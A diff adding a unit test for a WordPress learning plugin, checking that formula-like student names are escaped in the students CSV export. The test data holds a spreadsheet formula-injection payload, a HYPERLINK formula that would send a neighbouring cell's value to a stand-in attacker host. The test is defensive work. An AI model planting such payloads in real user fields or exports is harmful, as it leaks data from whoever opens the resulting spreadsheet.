@@ -51,6 +51,54 @@ class LLMS_Test_Table_Students extends LLMS_UnitTestCase {
 	}
 
 	/**
+	 * Learner-controlled names that look like formulas are prefixed in the students export.
+	 *
+	 * @since 10.3.1
+	 *
+	 * @return void
+	 */
+	public function test_get_export_prefixes_formula_names() {
+
+		wp_set_current_user( $this->factory->user->create( array( 'role' => 'administrator' ) ) );
+
+		$course_id = $this->factory->course->create();
+
+		$email = 'formula-student@example.com';
+		$this->factory->student->create_and_enroll(
+			$course_id,
+			array(
+				'user_email' => $email,
+				'first_name' => '=HYPERLINK("http://attacker.example/?x="&B1,"ClickMe")',
+				'last_name'  => '=1337*7',
+			)
+		);
+
+		$numeric_email = 'numeric-student@example.com';
+		$this->factory->student->create_and_enroll(
+			$course_id,
+			array(
+				'user_email' => $numeric_email,
+				'first_name' => 'Ada',
+				'last_name'  => '-12.5',
+			)
+		);
+
+		$table    = new LLMS_Table_Students();
+		$by_email = array();
+		foreach ( $table->get_export() as $row ) {
+			if ( isset( $row['email'] ) ) {
+				$by_email[ $row['email'] ] = $row;
+			}
+		}
+
+		$this->assertSame( "'=1337*7", $by_email[ $email ]['name_last'] );
+		$this->assertSame( '\'=HYPERLINK("http://attacker.example/?x="&B1,"ClickMe")', $by_email[ $email ]['name_first'] );
+		$this->assertSame( 'Ada', $by_email[ $numeric_email ]['name_first'] );
+		$this->assertSame( '-12.5', $by_email[ $numeric_email ]['name_last'] );
+
+	}
+
+	/**
 	 * test the generate_export_file() method.
 	 *
 	 * @return void
